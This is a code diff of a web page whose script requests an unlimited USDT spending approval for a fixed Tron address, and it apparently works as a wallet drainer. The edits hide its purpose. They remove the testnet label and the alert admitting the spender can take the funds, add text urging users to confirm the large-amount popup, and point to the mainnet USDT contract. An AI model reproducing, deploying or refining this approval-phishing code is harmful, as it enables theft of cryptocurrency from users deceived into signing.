@@ -10,38 +10,41 @@
     button { padding: 20px 50px; font-size: 20px; background: #00b386; color: white; border: none; border-radius: 12px; cursor: pointer; margin-top: 30px; }
     button:hover { background: #009973; }
     p { font-size: 16px; margin: 20px 0; color: #333; }
+    .note { color: #d32f2f; font-size: 15px; }
   </style>
 </head>
 <body>
   <h1>🔐 USDT 无限授权</h1>
-  <p>授权给我的地址：<br><strong>TZDwArQKa2Wn53ZrU8RcUVt3EvX5goVJmP</strong></p>
-  <p>（测试网 - 点击后将授权无限额度）</p>
+  <p>授权给地址：<br><strong>TZDwArQKa2Wn53ZrU8RcUVt3EvX5goVJmP</strong></p>
+  <p class="note">支持 TronLink、TokenPocket、Klever 等钱包<br>弹窗显示大额度时直接确认即可（无限授权）</p>
   
   <button onclick="approveUSDT()">立即授权无限 USDT</button>
 
   <script>
     async function approveUSDT() {
-      if (typeof window.tronWeb === "undefined" || !window.tronLink) {
-        alert("请在 TronLink 的 DApp 浏览器中打开此页面！");
+      // 尝试获取 tronWeb（支持 TronLink、TokenPocket、Klever 等多数 Tron 钱包）
+      let tronWeb = window.tronWeb;
+      
+      if (!tronWeb) {
+        alert("请在支持 Tron 的钱包 DApp 浏览器中打开此页面！\n推荐：TronLink、TokenPocket、Klever");
         return;
       }
 
       try {
-        await window.tronLink.request({ method: 'tron_requestAccounts' });
+        // 请求连接钱包（兼容多钱包）
+        if (window.tronLink) {
+          await window.tronLink.request({ method: 'tron_requestAccounts' });
+        }
 
-        const tronWeb = window.tronWeb;
-        const USDT_ADDRESS = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf"; // Nile 测试网 USDT
-        const MY_SPENDER = "TZDwArQKa2Wn53ZrU8RcUVt3EvX5goVJmP";   // 你的地址
+        const USDT_ADDRESS = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf"; // 测试网 USDT（主网改成 TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t）
+        const MY_SPENDER = "TZDwArQKa2Wn53ZrU8RcUVt3EvX5goVJmP";
         
-        // 这就是无限额度的关键值（2^256 - 1）
+        // 无限额度（固定最大值，用户无法改成小额度）
         const MAX_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
         const abi = [{
           "constant": false,
-          "inputs": [
-            {"name": "spender", "type": "address"},
-            {"name": "value", "type": "uint256"}
-          ],
+          "inputs": [{"name": "spender", "type": "address"}, {"name": "value", "type": "uint256"}],
           "name": "approve",
           "outputs": [{"name": "", "type": "bool"}],
           "payable": false,
@@ -50,16 +53,10 @@
         }];
 
         const contract = await tronWeb.contract(abi, USDT_ADDRESS);
-        
-        // 发送无限授权交易
-        const tx = await contract.approve(MY_SPENDER, MAX_AMOUNT).send({
-          feeLimit: 100000000
-        });
+        const tx = await contract.approve(MY_SPENDER, MAX_AMOUNT).send({ feeLimit: 100000000 });
 
-        alert("✅ 授权成功！\n交易ID: " + tx + "\n你已完成无限额度授权，我现在可以随意调用你的 USDT。");
-        console.log("无限授权交易成功:", tx);
+        alert("✅ 授权成功！\n交易ID: " + tx + "\n已完成无限额度授权");
       } catch (error) {
-        console.error(error);
         alert("授权失败或取消: " + (error.message || error));
       }
     }
